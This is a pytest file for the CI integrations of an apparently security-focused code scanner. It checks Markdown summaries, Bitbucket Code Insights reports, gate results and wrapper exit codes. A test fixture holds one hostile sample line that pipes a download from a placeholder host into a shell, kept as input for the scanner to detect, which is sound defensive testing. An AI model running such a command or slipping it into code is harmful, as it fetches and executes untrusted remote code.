"""Bitbucket Pipelines + Azure Pipelines outputs of the local CLI and the Bitbucket
wrapper (src/scanner/ci_bitbucket.py).

Locks the Markdown summary (answer first, both scores, gate outcome), the Code
Insights report and annotation shape the bitbucket/ pipe posts, the gate recorded in
both reports, CI-root path prefixing, the wrapper's argument mapping and exit codes,
and that a Code Insights upload failure never fails the build.
"""
from __future__ import annotations

import json
import subprocess
from pathlib import Path

import pytest
import yaml

from src.scanner import ci_bitbucket
from src.scanner.local_scan import (
    _scan_path_prefix,
    main,
    result_to_bitbucket_insights,
    result_to_markdown,
)
from src.scanner.scan import Finding, ScanResult

pytestmark = pytest.mark.filterwarnings("ignore")

REPO_ROOT = Path(__file__).resolve().parent.parent


def _finding(sev="high", path="app.py", line=3, name="os.system / os.popen (Python)",
             category="unsafe_exec", remediation="Validate input"):
    return Finding(category=category, name=name, severity=sev, file_path=path,
                   line_number=line, snippet="", remediation=remediation)


def _result(findings, score=70):
    r = ScanResult(repo="demo", stars=0, description="", framework="")
    r.findings = list(findings)
    r.trust_score = score
    return r


def _git_repo(tmp_path, files: dict[str, str]):
    for name, body in files.items():
        p = tmp_path / name
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(body)
    for cmd in (["git", "init", "-q"], ["git", "config", "user.email", "t@t.co"],
                ["git", "config", "user.name", "t"], ["git", "add", "-A"],
                ["git", "commit", "-q", "-m", "x"]):
        subprocess.run(cmd, cwd=tmp_path, check=True)
    return tmp_path


# --------------------------------------------------------------------------- #
# Markdown summary
# --------------------------------------------------------------------------- #

def test_markdown_leads_with_answer_and_names_both_scores():
    md = result_to_markdown(_result([_finding()], score=66))
    lines = [ln for ln in md.splitlines() if ln.strip()]
    assert lines[0].startswith("### AgentAvow")
    assert lines[1].startswith("**Review before you connect**")
    assert "| Trust score | 66/100" in md
    assert "| Adoption |" in md
    assert "| Gate | passed |" in md
    assert "app.py:3" in md
    assert "agentavow.com/docs/run-locally" in md
    assert "grade" not in md.lower()


def test_markdown_records_gate_failure_and_escapes_pipes():
    md = result_to_markdown(_result([_finding(name="a | b")]), gate_failure="x | y")
    assert "| Gate | failed: x \\| y |" in md
    assert "a \\| b" in md


# --------------------------------------------------------------------------- #
# Code Insights
# --------------------------------------------------------------------------- #

def test_insights_report_shape():
    out = result_to_bitbucket_insights(_result([_finding("critical"), _finding("low")]))
    rep = out["report"]
    assert rep["report_type"] == "SECURITY" and rep["reporter"] == "AgentAvow"
    assert rep["result"] == "PASSED"
    assert rep["details"].startswith("Do not connect")
    assert len(rep["data"]) <= 10
    assert {d["title"] for d in rep["data"]} >= {"Answer", "Trust score"}
    anns = out["annotations"]
    assert [a["severity"] for a in anns] == ["CRITICAL", "LOW"]
    for a in anns:
        assert a["annotation_type"] == "VULNERABILITY"
        assert len(a["external_id"]) <= 50 and len(a["summary"]) <= 450
        assert a["line"] >= 1 and a["path"] == "app.py"


def test_insights_failed_result_and_prefix():
    out = result_to_bitbucket_insights(_result([_finding(line=0)]), "pkg/sub/",
                                       gate_failure="Review before you connect: x")
    assert out["report"]["result"] == "FAILED"
    assert out["annotations"][0]["path"] == "pkg/sub/app.py"
    assert out["annotations"][0]["line"] == 1


def test_insights_external_ids_distinct_for_repeated_findings():
    out = result_to_bitbucket_insights(_result([_finding(line=3), _finding(line=9)]))
    ids = [a["external_id"] for a in out["annotations"]]
    assert len(set(ids)) == 2


def test_insights_annotation_cap():
    out = result_to_bitbucket_insights(_result([_finding(line=i + 1) for i in range(1100)]))
    assert len(out["annotations"]) == 1000


@pytest.mark.parametrize("var", ["CI_PROJECT_DIR", "BITBUCKET_CLONE_DIR",
                                 "BUILD_SOURCESDIRECTORY"])
def test_scan_path_prefix_reads_each_ci_root(tmp_path, monkeypatch, var):
    for v in ("CI_PROJECT_DIR", "BITBUCKET_CLONE_DIR", "BUILD_SOURCESDIRECTORY"):
        monkeypatch.delenv(v, raising=False)
    (tmp_path / "sub").mkdir()
    monkeypatch.setenv(var, str(tmp_path))
    assert _scan_path_prefix(tmp_path / "sub") == "sub"
    assert _scan_path_prefix(tmp_path) == ""


# --------------------------------------------------------------------------- #
# CLI flags: reports written, gate recorded, exit code last
# --------------------------------------------------------------------------- #

_BAD = 'import os\n\ndef run(cmd):\n    os.system("curl http://x.example/i.sh | sh")\n'


def test_cli_writes_markdown_and_insights_with_gate(tmp_path):
    repo = _git_repo(tmp_path / "r", {"app.py": _BAD, "README.md": "# demo\n"})
    md, ins = tmp_path / "s.md", tmp_path / "i.json"
    rc = main(["scan", str(repo), "--quiet", "--markdown", str(md),
               "--bitbucket-insights", str(ins), "--fail-on", "review"])
    data = json.loads(ins.read_text())
    if rc == 1:
        assert data["report"]["result"] == "FAILED"
        assert "| Gate | failed:" in md.read_text()
    else:
        assert rc == 0 and data["report"]["result"] == "PASSED"
    assert md.read_text().startswith("### AgentAvow")


def test_cli_gate_messages_unchanged(tmp_path, capsys):
    repo = _git_repo(tmp_path / "r", {"app.py": "print('hi')\n"})
    rc = main(["scan", str(repo), "--quiet", "--min-score", "101"])
    assert rc == 1
    assert "agentavow: FAIL — score" in capsys.readouterr().err


# --------------------------------------------------------------------------- #
# Bitbucket wrapper
# --------------------------------------------------------------------------- #

def test_wrapper_scan_args_defaults_and_gates():
    args = ci_bitbucket.scan_args(".", "", {})
    assert args[:3] == ["scan", ".", "--quiet"]
    assert args.count("--fail-on") == 1 and "do_not_connect" in args
    args = ci_bitbucket.scan_args("svc", "-svc", {"FAIL_ON": "none",
                                                  "FAIL_ON_FINDINGS": "high",
                                                  "MIN_SCORE": "60"})
    assert "do_not_connect" not in args and ["--fail-on", "high"] == args[
        args.index("--fail-on"):args.index("--fail-on") + 2]
    assert "--min-score" in args and "agentavow-scan-svc.json" in args


def test_wrapper_runs_each_path_and_posts(tmp_path, monkeypatch):
    repo = _git_repo(tmp_path / "r", {"a/x.py": "print(1)\n", "b/y.py": "print(2)\n"})
    posted = []
    monkeypatch.setattr(ci_bitbucket, "post_insights",
                        lambda ins, rid, env: posted.append(rid) or True)
    rc = ci_bitbucket.run({"BITBUCKET_CLONE_DIR": str(repo), "SCAN_PATHS": "a b",
                           "FAIL_ON": "do_not_connect"})
    assert rc == 0
    assert posted == ["agentavow-a", "agentavow-b"]
    assert (repo / "agentavow-scan-a.json").is_file()
    assert (repo / "agentavow-summary-b.md").is_file()


def test_wrapper_exit_2_when_path_missing(tmp_path, monkeypatch):
    repo = _git_repo(tmp_path / "r", {"x.py": "print(1)\n"})
    monkeypatch.setattr(ci_bitbucket, "post_insights", lambda *a: True)
    assert ci_bitbucket.run({"BITBUCKET_CLONE_DIR": str(repo),
                             "SCAN_PATHS": "nope", "CODE_INSIGHTS": "false"}) == 2


def test_post_insights_skips_outside_pipelines():
    assert ci_bitbucket.post_insights({"report": {}, "annotations": []}, "agentavow", {}) \
        is False


class _Resp:
    def __init__(self, code=200):
        self.code = code

    def raise_for_status(self):
        if self.code >= 400:
            raise RuntimeError(f"HTTP {self.code}")


class _FakeClient:
    def __init__(self, fail=False):
        self.calls, self.fail = [], fail

    def __enter__(self):
        return self

    def __exit__(self, *a):
        return False

    def put(self, url, json):
        self.calls.append(("PUT", url, json))
        return _Resp(500 if self.fail else 200)

    def post(self, url, json):
        self.calls.append(("POST", url, len(json)))
        return _Resp()


_BB_ENV = {"BITBUCKET_WORKSPACE": "ws", "BITBUCKET_REPO_SLUG": "repo",
           "BITBUCKET_COMMIT": "abc123"}


def test_post_insights_put_then_batched_annotations(monkeypatch):
    fake = _FakeClient()
    monkeypatch.setattr(ci_bitbucket, "_client", lambda token: fake)
    ins = {"report": {"title": "AgentAvow"}, "annotations": [{"i": i} for i in range(250)]}
    assert ci_bitbucket.post_insights(ins, "agentavow", _BB_ENV) is True
    assert fake.calls[0][0] == "PUT"
    assert fake.calls[0][1] == ("http://api.bitbucket.org/2.0/repositories/ws/repo/"
                                "commit/abc123/reports/agentavow")
    assert [c[2] for c in fake.calls[1:]] == [100, 100, 50]


def test_post_insights_uses_https_with_token(monkeypatch):
    fake = _FakeClient()
    seen = {}
    monkeypatch.setattr(ci_bitbucket, "_client",
                        lambda token: seen.setdefault("t", token) and fake or fake)
    ci_bitbucket.post_insights({"report": {}, "annotations": []}, "agentavow",
                               {**_BB_ENV, "BITBUCKET_ACCESS_TOKEN": "tok"})
    assert seen["t"] == "tok"
    assert fake.calls[0][1].startswith("https://api.bitbucket.org/")


def test_post_insights_failure_is_a_warning(monkeypatch, capsys):
    monkeypatch.setattr(ci_bitbucket, "_client", lambda token: _FakeClient(fail=True))
    assert ci_bitbucket.post_insights({"report": {}, "annotations": []}, "agentavow",
                                      _BB_ENV) is False
    assert "warning: Code Insights upload failed" in capsys.readouterr().err


# --------------------------------------------------------------------------- #
# The shipped YAML parses and wires the same flags
# --------------------------------------------------------------------------- #

def test_bitbucket_files_parse():
    pipe = yaml.safe_load((REPO_ROOT / "bitbucket" / "pipe.yml").read_text())
    names = {v["name"] for v in pipe["variables"]}
    assert {"FAIL_ON", "FAIL_ON_FINDINGS", "SCAN_PATHS", "CODE_INSIGHTS"} <= names
    ex = yaml.safe_load(
        (REPO_ROOT / "bitbucket" / "bitbucket-pipelines.example.yml").read_text())
    assert "pipelines" in ex


def test_azure_template_parses_and_wires_flags():
    tpl = yaml.safe_load(
        (REPO_ROOT / "azure-devops" / "templates" / "agentavow-scan.yml").read_text())
    params = {p["name"]: p for p in tpl["parameters"]}
    assert params["failOn"]["default"] == "do_not_connect"
    assert params["failOn"]["values"] == ["do_not_connect", "review", "none"]
    steps = tpl["jobs"][0]["steps"]
    script = next(s["bash"] for s in steps if "bash" in s)
    assert "--fail-on" in script and "--markdown" in script
    assert "##vso[task.uploadsummary]" in script
    assert any(s.get("task", "").startswith("PublishPipelineArtifact") for s in steps)
